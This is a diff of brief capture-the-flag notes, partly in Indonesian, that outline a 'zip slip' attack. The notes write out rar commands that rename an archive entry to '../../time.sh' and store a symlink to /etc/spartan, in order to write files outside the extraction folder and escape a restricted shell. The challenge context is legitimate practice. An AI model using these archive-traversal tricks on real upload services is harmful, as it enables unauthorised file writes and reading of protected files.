@@ -2,16 +2,28 @@ https://medium.com/@noobintheshell/xmasctf-part1-3fb1a38d0601
 https://superuser.com/questions/225163/rename-files-in-rar-file-without-extract-it
 
 1. create the payload
-nano time.sh
-"""
+$ nano time.sh
+=================================
 #!/bin/sh
+
 pwd
 ls
-cat Flagnya_dimari.txt
-"""
+cat Flagnya_bukan_dimari.txt
+=================================
 
-rar a evil.rar time.sh
-rar rn evil.rar time.sh "../../time.sh"
-2. upload
-3. go back to '/'
-4. get flag
+2. construct the bomb
+
+# step 1 -> cari dimana flagnya
+
+$ rar a evil.rar time.sh
+$ rar rn evil.rar time.sh "../../time.sh"
+
+> upload
+> go back to '/'
+> get the location of the flag
+
+# step 2 -> keluar dari rbash, pake zipslip symlink
+
+$ rar a -ol more_evil.rar /etc/spartan
+> upload
+> get the flag
